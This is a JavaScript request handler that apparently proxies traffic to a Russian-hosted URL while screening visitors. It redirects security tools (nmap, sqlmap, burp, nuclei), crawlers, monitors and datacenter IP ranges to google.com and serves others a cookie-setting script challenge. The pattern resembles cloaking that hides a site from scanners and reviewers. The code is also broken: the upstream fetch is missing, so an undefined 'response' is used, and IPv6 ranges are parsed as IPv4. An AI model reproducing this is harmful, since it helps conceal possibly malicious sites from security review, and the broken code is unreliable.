const BASE_URL = "https://europolus.ru/ar";

let rateMap = {};
const RATE_LIMIT_PERIOD = 60000;
const RATE_LIMIT_MAX = 60;

const BAD_AGENTS = [
  "nmap", "sqlmap", "burp", "nuclei", "masscan", "fping", "zerotrace",
  "python-requests", "curl", "wget", "httpie", "postman", "jsoup",
  "selenium", "puppeteer", "playwright", "chrome-headless", "phantomjs",
  "bot", "spider", "crawler", "scraper", "uptime", "monitor", "pingdom",
  "googlebot", "bingbot", "slurp", "duckduckbot", "baiduspider", "yandexbot"
];

const DATA_CENTER_IPS = [
  "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22", "104.16.0.0/13",
  "104.24.0.0/14", "108.62.0.0/15", "131.0.72.0/22", "141.101.64.0/18",
  "162.158.0.0/15", "172.64.0.0/13", "173.245.48.0/20", "188.114.96.0/20",
  "190.93.240.0/20", "197.234.240.0/22", "198.41.128.0/17", "199.232.96.0/23",
  "2400:cb00:0::/32", "2606:4700:0::/32", "2803:f800:0::/32", "2405:b500::/32",
  "2405:8100::/32", "2c0f:f248::/32"
];

function isBadAgent(ua) {
  const lowerUa = ua.toLowerCase();
  return BAD_AGENTS.some(agent => lowerUa.includes(agent));
}

function isDatacenterIp(ip) {
  const ipNum = ip.split('.').reduce((acc, octet) => (acc << 8) + parseInt(octet, 10), 0) >>> 0;
  
  for (const cidr of DATA_CENTER_IPS) {
    const [network, mask] = cidr.split('/');
    const networkNum = network.split('.').reduce((acc, octet) => (acc << 8) + parseInt(octet, 10), 0) >>> 0;
    const maskNum = 0xFFFFFFFF << (32 - parseInt(mask, 10));
    if ((ipNum & maskNum) === (networkNum & maskNum)) {
      return true;
    }
  }
  return false;
}

function isRateLimited(ip) {
  const now = Date.now();
  if (!rateMap[ip]) rateMap[ip] = [];
  
  rateMap[ip] = rateMap[ip].filter(timestamp => now - timestamp < RATE_LIMIT_PERIOD);
  
  if (rateMap[ip].length >= RATE_LIMIT_MAX) {
    return true;
  }
  
  rateMap[ip].push(now);
  return false;
}

function getChallengePage() {
  return `
    <script>
      document.cookie = "hv=1";
      window.location.href = window.location.pathname + window.location.search + "?c=1";
    </script>
  `;
}

function getProxyHeaders(headers) {
  const newHeaders = new Headers();
  const allowedHeaders = ['host', 'accept', 'accept-encoding', 'accept-language', 'cookie', 'user-agent', 'sec-ch-ua', 'sec-ch-ua-mobile', 'sec-ch-ua-platform', 'sec-fetch-dest', 'sec-fetch-mode', 'sec-fetch-site', 'upgrade-insecure-requests', 'referer'];
  
  for (const [key, value] of headers.entries()) {
    if (allowedHeaders.includes(key.toLowerCase())) {
      newHeaders.set(key, value);
    }
  }
  return newHeaders;
}

export default async function handler(req, res) {
  const url = new URL(req.url);
  
  let path = url.pathname;
  if (path === '/') path = '';
  
  const targetUrl = BASE_URL + path + url.search;

  const clientIp = req.headers.get('x-forwarded-for') || req.headers.get('x-real-ip') || '0.0.0.0';
  
  const ua = req.headers.get('user-agent') || '';
  const ipScore = isDatacenterIp(clientIp) ? 3 : 0;
  const agentScore = isBadAgent(ua) ? 2 : 0;
  const cookieScore = req.headers.get('cookie') && req.headers.get('cookie').includes('hv') ? -2 : 0;
  const queryScore = url.searchParams.has('c') ? 0 : 1; 
  
  const botScore = ipScore + agentScore + cookieScore + queryScore;
  
  if (botScore >= 5) {
    return res.redirect('https://google.com');
  }
  
  const cookie = req.headers.get('cookie') || '';
  if (!cookie.includes('hv') && !url.searchParams.has('c')) {
    return res.send(getChallengePage());
  }
  
  if (isRateLimited(clientIp)) {
    return res.status(429).send('Too many requests');
  }
  
const text = await response.text();
res.status(response.status);
response.headers.forEach((value, key) => res.setHeader(key, value));
return res.send(text);
